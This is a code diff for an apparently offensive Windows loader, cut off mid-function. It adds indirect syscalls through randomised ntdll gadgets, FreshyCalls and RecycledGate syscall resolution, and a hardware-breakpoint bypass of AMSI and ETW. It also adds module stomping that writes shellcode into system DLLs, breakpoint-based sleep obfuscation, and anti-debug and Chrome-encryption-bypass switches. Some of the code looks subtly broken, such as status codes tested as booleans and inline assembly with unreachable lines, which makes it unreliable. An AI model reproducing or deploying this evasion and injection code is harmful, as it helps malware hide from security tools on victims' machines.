@@ -20,6 +20,7 @@
 #include <tlhelp32.h>
 #include <processthreadsapi.h>
 #include <timeapi.h>
+#include <iphlpapi.h>
 
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "kernel32.lib")
@@ -28,6 +29,7 @@
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "iphlpapi.lib")
 
 typedef LONG NTSTATUS;
 typedef unsigned long long QWORD;
@@ -39,21 +41,26 @@ typedef uint32_t DWORD32;
 #define CONFIG_ENABLE_HELLS_GATE 1
 #define CONFIG_ENABLE_HALOS_GATE 1
 #define CONFIG_ENABLE_TARTARUS_GATE 1
-#define CONFIG_ENABLE_NULLGATE 1
-#define CONFIG_ENABLE_HEAVENS_GATE 1
+#define CONFIG_ENABLE_FRESHYCALLS 1
+#define CONFIG_ENABLE_RECYCLED_GATE 1
 #define CONFIG_ENABLE_INDIRECT_SYSCALL 1
 #define CONFIG_ENABLE_NTDLL_UNHOOKING 1
-#define CONFIG_ENABLE_ETW_PATCHING 1
-#define CONFIG_ENABLE_AMSI_BYPASS 1
+#define CONFIG_ENABLE_ETW_PATCHING 0
+#define CONFIG_ENABLE_AMSI_BYPASS 0
+#define CONFIG_ENABLE_PATCHLESS_AMSI_ETW 1
 #define CONFIG_ENABLE_MODULE_STOMPING 1
 #define CONFIG_ENABLE_SLEEP_OBFUSCATION 1
+#define CONFIG_ENABLE_HWBP_SLEEP 1
 #define CONFIG_ENABLE_CALLSTACK_SPOOFING 1
 #define CONFIG_ENABLE_HWBP_CLEARING 1
 #define CONFIG_ENABLE_ANTI_VM 1
+#define CONFIG_ENABLE_ANTI_DEBUG 1
 #define CONFIG_ENABLE_CHROME_ABE_BYPASS 1
+#define CONFIG_ENABLE_DJB2_HASHING 1
 
 #define XOR_KEY 0xDEADBEEF
 #define PAYLOAD_XOR_KEY 0xAA
+#define DJB2_SEED 5381
 
 extern "C" void IndirectSyscall5(DWORD ssn, ...);
 extern "C" void IndirectSyscall6(DWORD ssn, ...);
@@ -74,7 +81,8 @@ typedef struct _NTDLL_GADGET {
 static SYSCALL_ENTRY g_syscalls[256];
 static DWORD g_syscallCount = 0;
 static NTDLL_GADGET g_ntdllGadget = { 0 };
-static HANDLE g_sleepEvent = NULL;
+static PVOID g_syscallGadgets[64] = { 0 };
+static DWORD g_syscallGadgetCount = 0;
 static bool g_unhooked = false;
 
 extern "C" {
@@ -94,47 +102,49 @@ extern "C" {
     NTSTATUS NtWaitForSingleObject(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
 }
 
-static inline DWORD XorHash(const char* str, DWORD key) {
-    DWORD hash = 0;
-    while (*str) {
-        hash = (hash * 33) ^ (*str++ ^ key);
+static DWORD DJB2Hash(const char* str) {
+    DWORD hash = DJB2_SEED;
+    int c;
+    while ((c = *str++)) {
+        hash = ((hash << 5) + hash) + c;
     }
     return hash;
 }
 
-static inline void XorDecryptString(char* str, DWORD key) {
+static DWORD DJB2HashW(const wchar_t* str) {
+    DWORD hash = DJB2_SEED;
+    while (*str) {
+        hash = ((hash << 5) + hash) + *str++;
+    }
+    return hash;
+}
+
+static void XorDecryptString(char* str, DWORD key) {
     size_t len = strlen(str);
     for (size_t i = 0; i < len; i++) {
         str[i] ^= (key >> ((i % 4) * 8)) & 0xFF;
     }
 }
 
-static inline void XorEncryptPayload(BYTE* data, SIZE_T size, BYTE key) {
+static void XorEncryptPayload(BYTE* data, SIZE_T size, BYTE key) {
     for (SIZE_T i = 0; i < size; i++) {
         data[i] ^= key;
     }
 }
 
-static inline bool IsBytePattern(PBYTE data, PBYTE pattern, SIZE_T len) {
-    for (SIZE_T i = 0; i < len; i++) {
-        if (data[i] != pattern[i]) return false;
-    }
-    return true;
-}
-
-static inline DWORD GetSyscallNumberFromStub(PBYTE stub) {
-    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
-        return *(DWORD*)(stub + 4);
-    }
-    return 0xFFFFFFFF;
-}
-
-static inline bool IsSyscallStub(PBYTE addr) {
+static bool IsSyscallStub(PBYTE addr) {
     return (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8);
 }
 
-static inline bool IsHooked(PBYTE addr) {
+static bool IsHooked(PBYTE addr) {
     return (addr[0] == 0xE9 || addr[0] == 0xEB || addr[0] == 0xFF);
+}
+
+static DWORD GetSyscallNumberFromStub(PBYTE stub) {
+    if (IsSyscallStub(stub)) {
+        return *(DWORD*)(stub + 4);
+    }
+    return 0xFFFFFFFF;
 }
 
 static HMODULE GetNtdllBase() {
@@ -145,25 +155,52 @@ static PVOID GetNtdllExport(HMODULE hNtdll, const char* name) {
     return GetProcAddress(hNtdll, name);
 }
 
-static DWORD64 FindSyscallNumberHellsGate(const char* functionName) {
+static DWORD FindSyscallNumberFreshyCalls(const char* functionName) {
     HMODULE hNtdll = GetNtdllBase();
     if (!hNtdll) return 0xFFFFFFFF;
 
-    PVOID pFunc = GetNtdllExport(hNtdll, functionName);
-    if (!pFunc) return 0xFFFFFFFF;
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-    PBYTE pBytes = (PBYTE)pFunc;
+    DWORD* pNames = (DWORD*)((PBYTE)hNtdll + pExport->AddressOfNames);
+    WORD* pOrdinals = (WORD*)((PBYTE)hNtdll + pExport->AddressOfNameOrdinals);
+    DWORD* pFunctions = (DWORD*)((PBYTE)hNtdll + pExport->AddressOfFunctions);
 
-    for (int i = 0; i < 64; i++) {
-        if (IsSyscallStub(pBytes + i)) {
-            return GetSyscallNumberFromStub(pBytes + i);
+    struct ExportEntry {
+        DWORD rva;
+        WORD ordinal;
+        char name[64];
+    };
+
+    std::vector<ExportEntry> ntExports;
+
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        const char* name = (const char*)((PBYTE)hNtdll + pNames[i]);
+        if (name[0] == 'N' && name[1] == 't' && name[2] != 'd') {
+            ExportEntry entry;
+            entry.rva = pFunctions[pOrdinals[i]];
+            entry.ordinal = pOrdinals[i];
+            strcpy(entry.name, name);
+            ntExports.push_back(entry);
+        }
+    }
+
+    std::sort(ntExports.begin(), ntExports.end(),
+        [](const ExportEntry& a, const ExportEntry& b) {
+            return a.rva < b.rva;
+        });
+
+    for (size_t i = 0; i < ntExports.size(); i++) {
+        if (strcmp(ntExports[i].name, functionName) == 0) {
+            return (DWORD)i;
         }
     }
 
     return 0xFFFFFFFF;
 }
 
-static DWORD64 FindSyscallNumberHalosGate(const char* functionName) {
+static DWORD FindSyscallNumberRecycledGate(const char* functionName) {
     HMODULE hNtdll = GetNtdllBase();
     if (!hNtdll) return 0xFFFFFFFF;
 
@@ -173,110 +210,76 @@ static DWORD64 FindSyscallNumberHalosGate(const char* functionName) {
     PBYTE pBytes = (PBYTE)pFunc;
 
     if (IsSyscallStub(pBytes)) {
-        return GetSyscallNumberFromStub(pBytes);
+        DWORD ssn = GetSyscallNumberFromStub(pBytes);
+        if (ssn != 0xFFFFFFFF) return ssn;
     }
 
-    if (!IsHooked(pBytes)) {
-        for (int i = 0; i < 64; i++) {
-            if (IsSyscallStub(pBytes + i)) {
-                return GetSyscallNumberFromStub(pBytes + i);
-            }
-        }
-        return 0xFFFFFFFF;
-    }
-
-    int distance = 0;
-    for (int i = 1; i < 4096; i++) {
-        PBYTE p = pBytes - i;
-        if (IsSyscallStub(p)) {
-            if (!IsHooked(p)) {
-                DWORD ssn = GetSyscallNumberFromStub(p);
+    if (IsHooked(pBytes)) {
+        for (int i = 1; i < 512; i++) {
+            PBYTE pPrev = pBytes - i;
+            if (IsSyscallStub(pPrev) && !IsHooked(pPrev)) {
+                DWORD ssn = GetSyscallNumberFromStub(pPrev);
                 if (ssn != 0xFFFFFFFF) {
-                    return ssn + distance;
+                    return ssn + i;
                 }
             }
-            distance++;
         }
-    }
 
-    distance = 0;
-    for (int i = 1; i < 4096; i++) {
-        PBYTE p = pBytes + i;
-        if (IsSyscallStub(p)) {
-            if (!IsHooked(p)) {
-                DWORD ssn = GetSyscallNumberFromStub(p);
+        for (int i = 1; i < 512; i++) {
+            PBYTE pNext = pBytes + i;
+            if (IsSyscallStub(pNext) && !IsHooked(pNext)) {
+                DWORD ssn = GetSyscallNumberFromStub(pNext);
                 if (ssn != 0xFFFFFFFF) {
-                    return ssn - distance;
+                    return ssn - i;
                 }
             }
-            distance++;
         }
     }
 
-    return 0xFFFFFFFF;
+    return FindSyscallNumberFreshyCalls(functionName);
 }
 
-static DWORD64 FindSyscallNumberTartarusGate(const char* functionName) {
+static void BuildSyscallGadgetPool() {
     HMODULE hNtdll = GetNtdllBase();
-    if (!hNtdll) return 0xFFFFFFFF;
+    if (!hNtdll) return;
 
-    PVOID pFunc = GetNtdllExport(hNtdll, functionName);
-    if (!pFunc) return 0xFFFFFFFF;
+    PBYTE pNtdll = (PBYTE)hNtdll;
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
 
-    PBYTE pBytes = (PBYTE)pFunc;
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
+            PBYTE textStart = pNtdll + pSection[i].VirtualAddress;
+            DWORD textSize = pSection[i].Misc.VirtualSize;
 
-    if (IsSyscallStub(pBytes)) {
-        return GetSyscallNumberFromStub(pBytes);
-    }
-
-    if (pBytes[0] == 0xE9 || pBytes[0] == 0xEB) {
-        PBYTE pJmpTarget = NULL;
-        if (pBytes[0] == 0xE9) {
-            DWORD offset = *(DWORD*)(pBytes + 1);
-            pJmpTarget = pBytes + 5 + offset;
-        } else if (pBytes[0] == 0xEB) {
-            pJmpTarget = pBytes + 2 + (signed char)pBytes[1];
-        }
-
-        if (pJmpTarget && IsSyscallStub(pJmpTarget)) {
-            return GetSyscallNumberFromStub(pJmpTarget);
-        }
-
-        if (pJmpTarget && !IsHooked(pJmpTarget)) {
-            for (int i = 0; i < 64; i++) {
-                if (IsSyscallStub(pJmpTarget + i)) {
-                    return GetSyscallNumberFromStub(pJmpTarget + i);
+            for (DWORD j = 0; j < textSize - 3; j++) {
+                if (textStart[j] == 0x0F && textStart[j + 1] == 0x05 &&
+                    textStart[j + 2] == 0xC3) {
+                    if (g_syscallGadgetCount < 64) {
+                        g_syscallGadgets[g_syscallGadgetCount++] = textStart + j;
+                    }
                 }
             }
+            break;
         }
     }
+}
 
-    if (pBytes[0] == 0xFF && pBytes[1] == 0x25) {
-        PBYTE pAddr = *(PBYTE*)(pBytes + 2);
-        if (pAddr && IsSyscallStub(pAddr)) {
-            return GetSyscallNumberFromStub(pAddr);
-        }
-    }
+static PVOID SelectRandomGadget() {
+    if (g_syscallGadgetCount == 0) return g_ntdllGadget.syscallAddr;
 
-    if (pBytes[0] == 0x48 && pBytes[1] == 0xB8) {
-        PBYTE pAddr = *(PBYTE*)(pBytes + 2);
-        if (pAddr) {
-            for (int i = 0; i < 64; i++) {
-                if (IsSyscallStub(pAddr + i)) {
-                    return GetSyscallNumberFromStub(pAddr + i);
-                }
-            }
-        }
-    }
-
-    return FindSyscallNumberHalosGate(functionName);
+    unsigned int seed = (unsigned int)__rdtsc();
+    std::mt19937 rng(seed);
+    std::uniform_int_distribution<DWORD> dist(0, g_syscallGadgetCount - 1);
+    return g_syscallGadgets[dist(rng)];
 }
 
 static bool ResolveSyscall(const char* name, PSYSCALL_ENTRY entry) {
     DWORD ssn = 0xFFFFFFFF;
 
-#if CONFIG_ENABLE_TARTARUS_GATE
-    ssn = FindSyscallNumberTartarusGate(name);
+#if CONFIG_ENABLE_RECYCLED_GATE
+    ssn = FindSyscallNumberRecycledGate(name);
     if (ssn != 0xFFFFFFFF) {
         entry->ssn = ssn;
         entry->address = GetNtdllExport(GetNtdllBase(), name);
@@ -285,18 +288,8 @@ static bool ResolveSyscall(const char* name, PSYSCALL_ENTRY entry) {
     }
 #endif
 
-#if CONFIG_ENABLE_HALOS_GATE
-    ssn = FindSyscallNumberHalosGate(name);
-    if (ssn != 0xFFFFFFFF) {
-        entry->ssn = ssn;
-        entry->address = GetNtdllExport(GetNtdllBase(), name);
-        strcpy(entry->name, name);
-        return true;
-    }
-#endif
-
-#if CONFIG_ENABLE_HELLS_GATE
-    ssn = FindSyscallNumberHellsGate(name);
+#if CONFIG_ENABLE_FRESHYCALLS
+    ssn = FindSyscallNumberFreshyCalls(name);
     if (ssn != 0xFFFFFFFF) {
         entry->ssn = ssn;
         entry->address = GetNtdllExport(GetNtdllBase(), name);
@@ -335,26 +328,11 @@ static bool InitializeSyscalls() {
         }
     }
 
-    PBYTE pNtdll = (PBYTE)hNtdll;
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
-    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+    BuildSyscallGadgetPool();
 
-    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
-            PBYTE textStart = pNtdll + pSection[i].VirtualAddress;
-            DWORD textSize = pSection[i].Misc.VirtualSize;
-
-            for (DWORD j = 0; j < textSize - 16; j++) {
-                if (textStart[j] == 0x0F && textStart[j + 1] == 0x05 &&
-                    textStart[j + 2] == 0xC3) {
-                    g_ntdllGadget.syscallAddr = textStart + j;
-                    g_ntdllGadget.retAddr = textStart + j + 3;
-                    return true;
-                }
-            }
-            break;
-        }
+    if (g_syscallGadgetCount > 0) {
+        g_ntdllGadget.syscallAddr = g_syscallGadgets[0];
+        g_ntdllGadget.retAddr = (PBYTE)g_syscallGadgets[0] + 3;
     }
 
     return g_syscallCount > 0;
@@ -374,24 +352,17 @@ static NTSTATUS NtAllocateVirtualMemorySyscall(HANDLE ProcessHandle, PVOID* Base
     SYSCALL_ENTRY* entry = FindSyscallEntry("NtAllocateVirtualMemory");
     if (!entry) return STATUS_UNSUCCESSFUL;
 
-#if CONFIG_ENABLE_INDIRECT_SYSCALL
     NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
     __asm {
         mov r10, rcx
         mov eax, entry->ssn
-        mov r11, g_ntdllGadget.syscallAddr
+        mov r11, gadget
         jmp r11
         mov result, eax
     }
     return result;
-#else
-    __asm {
-        mov r10, rcx
-        mov eax, entry->ssn
-        syscall
-        ret
-    }
-#endif
 }
 
 static NTSTATUS NtProtectVirtualMemorySyscall(HANDLE ProcessHandle, PVOID* BaseAddress,
@@ -400,10 +371,12 @@ static NTSTATUS NtProtectVirtualMemorySyscall(HANDLE ProcessHandle, PVOID* BaseA
     if (!entry) return STATUS_UNSUCCESSFUL;
 
     NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
     __asm {
         mov r10, rcx
         mov eax, entry->ssn
-        mov r11, g_ntdllGadget.syscallAddr
+        mov r11, gadget
         jmp r11
         mov result, eax
     }
@@ -418,10 +391,12 @@ static NTSTATUS NtCreateThreadExSyscall(PHANDLE ThreadHandle, ACCESS_MASK Desire
     if (!entry) return STATUS_UNSUCCESSFUL;
 
     NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
     __asm {
         mov r10, rcx
         mov eax, entry->ssn
-        mov r11, g_ntdllGadget.syscallAddr
+        mov r11, gadget
         jmp r11
         mov result, eax
     }
@@ -434,10 +409,48 @@ static NTSTATUS NtWriteVirtualMemorySyscall(HANDLE ProcessHandle, PVOID BaseAddr
     if (!entry) return STATUS_UNSUCCESSFUL;
 
     NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
     __asm {
         mov r10, rcx
         mov eax, entry->ssn
-        mov r11, g_ntdllGadget.syscallAddr
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtReadVirtualMemorySyscall(HANDLE ProcessHandle, PVOID BaseAddress,
+    PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtReadVirtualMemory");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtOpenProcessSyscall(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtOpenProcess");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
         jmp r11
         mov result, eax
     }
@@ -449,10 +462,48 @@ static NTSTATUS NtResumeThreadSyscall(HANDLE ThreadHandle, PULONG SuspendCount) 
     if (!entry) return STATUS_UNSUCCESSFUL;
 
     NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
     __asm {
         mov r10, rcx
         mov eax, entry->ssn
-        mov r11, g_ntdllGadget.syscallAddr
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtSuspendThreadSyscall(HANDLE ThreadHandle, PULONG SuspendCount) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtSuspendThread");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtQueryInformationProcessSyscall(HANDLE ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation,
+    ULONG ProcessInformationLength, PULONG ReturnLength) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtQueryInformationProcess");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
         jmp r11
         mov result, eax
     }
@@ -464,10 +515,82 @@ static NTSTATUS NtCloseSyscall(HANDLE Handle) {
     if (!entry) return STATUS_UNSUCCESSFUL;
 
     NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
     __asm {
         mov r10, rcx
         mov eax, entry->ssn
-        mov r11, g_ntdllGadget.syscallAddr
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtGetContextThreadSyscall(HANDLE ThreadHandle, PCONTEXT Context) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtGetContextThread");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtSetContextThreadSyscall(HANDLE ThreadHandle, PCONTEXT Context) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtSetContextThread");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtQueueApcThreadSyscall(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtQueueApcThread");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
+        jmp r11
+        mov result, eax
+    }
+    return result;
+}
+
+static NTSTATUS NtWaitForSingleObjectSyscall(HANDLE ObjectHandle, BOOLEAN Alertable,
+    PLARGE_INTEGER Timeout) {
+    SYSCALL_ENTRY* entry = FindSyscallEntry("NtWaitForSingleObject");
+    if (!entry) return STATUS_UNSUCCESSFUL;
+
+    NTSTATUS result;
+    PVOID gadget = SelectRandomGadget();
+
+    __asm {
+        mov r10, rcx
+        mov eax, entry->ssn
+        mov r11, gadget
         jmp r11
         mov result, eax
     }
@@ -530,108 +653,112 @@ static bool UnhookNtdll() {
     return success;
 }
 
-static bool PatchETW() {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return false;
+static bool PatchlessAmsiEtwBypass() {
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
-    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-    PVOID pEtwEventWriteFull = GetProcAddress(hNtdll, "EtwEventWriteFull");
+    HANDLE hThread = GetCurrentThread();
 
-    if (!pEtwEventWrite && !pEtwEventWriteFull) return false;
+    if (!NtGetContextThreadSyscall(hThread, &ctx)) {
+        return false;
+    }
 
-    DWORD oldProtect;
-
-    if (pEtwEventWrite) {
-        if (VirtualProtect(pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-            PBYTE p = (PBYTE)pEtwEventWrite;
-            p[0] = 0xC3;
-            p[1] = 0xCC;
-            p[2] = 0xCC;
-            p[3] = 0xCC;
-            VirtualProtect(pEtwEventWrite, 8, oldProtect, &oldProtect);
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (hAmsi) {
+        PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+        if (pAmsiScanBuffer) {
+            ctx.Dr0 = (DWORD64)pAmsiScanBuffer;
         }
     }
 
-    if (pEtwEventWriteFull) {
-        if (VirtualProtect(pEtwEventWriteFull, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-            PBYTE p = (PBYTE)pEtwEventWriteFull;
-            p[0] = 0xC3;
-            p[1] = 0xCC;
-            p[2] = 0xCC;
-            p[3] = 0xCC;
-            VirtualProtect(pEtwEventWriteFull, 8, oldProtect, &oldProtect);
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+        if (pEtwEventWrite) {
+            ctx.Dr1 = (DWORD64)pEtwEventWrite;
         }
+    }
+
+    ctx.Dr7 = 0x00000000;
+    ctx.Dr7 |= (1 << 0) | (1 << 2);
+    ctx.Dr7 |= (1 << 16) | (1 << 20);
+
+    if (!NtSetContextThreadSyscall(hThread, &ctx)) {
+        return false;
     }
 
     return true;
 }
 
-static bool PatchAMSI() {
-    HMODULE hAmsi = LoadLibraryA("amsi.dll");
-    if (!hAmsi) {
-        hAmsi = GetModuleHandleA("amsi.dll");
-        if (!hAmsi) return false;
-    }
+static bool ModuleStompingWithPdata(BYTE* shellcode, SIZE_T size) {
+    const char* dlls[] = {
+        "xpsservices.dll",
+        "mfreadwrite.dll",
+        "dbgcore.dll",
+        "mfsensorgroup.dll"
+    };
 
-    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-    if (!pAmsiScanBuffer) return false;
+    unsigned int seed = (unsigned int)__rdtsc();
+    std::mt19937 rng(seed);
+    std::uniform_int_distribution<int> dist(0, 3);
 
-    DWORD oldProtect;
-    if (VirtualProtect(pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        PBYTE p = (PBYTE)pAmsiScanBuffer;
-        p[0] = 0xB8;
-        p[1] = 0x01;
-        p[2] = 0x00;
-        p[3] = 0x00;
-        p[4] = 0x00;
-        p[5] = 0xC3;
-        VirtualProtect(pAmsiScanBuffer, 8, oldProtect, &oldProtect);
-        return true;
-    }
+    for (int attempt = 0; attempt < 4; attempt++) {
+        int idx = dist(rng);
+        HMODULE hModule = LoadLibraryA(dlls[idx]);
 
-    return false;
-}
-
-static bool ModuleStomping(BYTE* shellcode, SIZE_T size) {
-    HMODULE hModule = LoadLibraryA("winmm.dll");
-    if (!hModule) return false;
-
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
-    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
-
-    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
-            PVOID targetAddr = (PBYTE)hModule + pSection[i].VirtualAddress;
-            DWORD sectionSize = pSection[i].Misc.VirtualSize;
-
-            if (sectionSize < size) {
-                sectionSize = (DWORD)size;
-            }
-
-            DWORD oldProtect;
-            if (VirtualProtect(targetAddr, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                memcpy(targetAddr, shellcode, size);
-                VirtualProtect(targetAddr, sectionSize, oldProtect, &oldProtect);
-                return true;
-            }
-            break;
+        if (!hModule) {
+            FreeLibrary(hModule);
+            continue;
         }
+
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
+        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
+        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+
+        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+            if (strcmp((char*)pSection[i].Name, ".text") == 0) {
+                PVOID targetAddr = (PBYTE)hModule + pSection[i].VirtualAddress;
+                DWORD sectionSize = pSection[i].Misc.VirtualSize;
+
+                if (sectionSize < size) {
+                    sectionSize = (DWORD)size;
+                }
+
+                DWORD oldProtect;
+                if (VirtualProtect(targetAddr, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+                    memcpy(targetAddr, shellcode, size);
+
+                    RUNTIME_FUNCTION* pRuntimeFunction = (RUNTIME_FUNCTION*)malloc(sizeof(RUNTIME_FUNCTION));
+                    if (pRuntimeFunction) {
+                        pRuntimeFunction->BeginAddress = 0;
+                        pRuntimeFunction->EndAddress = (DWORD)size;
+                        pRuntimeFunction->UnwindInfoAddress = 0;
+                        RtlAddFunctionTable(pRuntimeFunction, 1, (DWORD64)targetAddr);
+                    }
+
+                    VirtualProtect(targetAddr, sectionSize, oldProtect, &oldProtect);
+                    return true;
+                }
+                break;
+            }
+        }
+
+        FreeLibrary(hModule);
     }
 
     return false;
 }
 
-static void SleepObfuscation(BYTE* data, SIZE_T size, DWORD milliseconds) {
+static bool HwbpSleepObfuscation(BYTE* data, SIZE_T size, DWORD milliseconds) {
     if (!data || size == 0) {
         Sleep(milliseconds);
-        return;
+        return false;
     }
 
     BYTE* encrypted = (BYTE*)malloc(size);
     if (!encrypted) {
         Sleep(milliseconds);
-        return;
+        return false;
     }
 
     memcpy(encrypted, data, size);
@@ -644,17 +771,45 @@ static void SleepObfuscation(BYTE* data, SIZE_T size, DWORD milliseconds) {
 
     free(encrypted);
 
-    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-    if (hEvent) {
-        WaitForSingleObject(hEvent, milliseconds);
-        CloseHandle(hEvent);
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    HANDLE hThread = GetCurrentThread();
+
+    if (!NtGetContextThreadSyscall(hThread, &ctx)) {
+        Sleep(milliseconds);
+        goto decrypt;
+    }
+
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    PVOID pNtWaitForSingleObject = GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+    if (pNtWaitForSingleObject) {
+        ctx.Dr2 = (DWORD64)pNtWaitForSingleObject;
+        ctx.Dr7 = (ctx.Dr7 & ~0x000F0000) | (1 << 18);
+        ctx.Dr7 &= ~0x00000004;
+
+        if (NtSetContextThreadSyscall(hThread, &ctx)) {
+            HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+            if (hEvent) {
+                NtWaitForSingleObjectSyscall(hEvent, FALSE, NULL);
+                CloseHandle(hEvent);
+            } else {
+                Sleep(milliseconds);
+            }
+        } else {
+            Sleep(milliseconds);
+        }
     } else {
         Sleep(milliseconds);
     }
 
+decrypt:
     VirtualProtect(data, size, PAGE_READWRITE, &oldProtect);
     XorEncryptPayload(data, size, PAYLOAD_XOR_KEY);
     VirtualProtect(data, size, oldProtect, &oldProtect);
+
+    return true;
 }
 
 static bool ClearHardwareBreakpoints() {
@@ -662,13 +817,13 @@ static bool ClearHardwareBreakpoints() {
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
